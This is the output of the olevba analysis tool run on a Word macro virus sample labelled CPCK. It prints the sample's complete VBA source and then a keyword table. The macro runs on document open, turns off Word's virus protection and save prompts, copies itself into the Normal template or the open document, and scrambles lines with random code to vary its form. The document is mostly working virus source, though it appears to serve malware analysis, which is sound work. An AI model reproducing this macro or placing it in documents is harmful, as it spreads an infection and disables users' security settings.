olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-7a931113f528a5bc1e0a1272d84b3b6bca8b0cd2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-7a931113f528a5bc1e0a1272d84b3b6bca8b0cd2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next

EO11 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Application.EnableCancelKey = 0

KD86 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.VirusProtection = 0

Options.SaveNormalPrompt = 0

Options.ConfirmConversions = 0

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set SA49 = ActiveDocument.VBProject.VBComponents.Item(1)

SQ74 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set SA49 = NormalTemplate.VBProject.VBComponents.Item(1)

ST59 = True

End If

If ST59 <> True And SQ74 <> True Then GoTo ML64

If ST59 = True Then SA49.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KD86 - 1))

If SQ74 = True Then SA49.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, EO11 - 1))

With SA49.CodeModule

For x = 2 To (SA49.CodeModule.CountOfLines - 1) Step 2

For y = 1 To (Int(Rnd * 10) + 2)

BO61 = BO61 + (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & " + "

Next y

.replaceline x, (Chr(65 + Int(Rnd * 22))) & " = " & BO61 & (Chr(65 + Int(Rnd * 22)))

BO61 = ""

Next x

End With

ML64:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

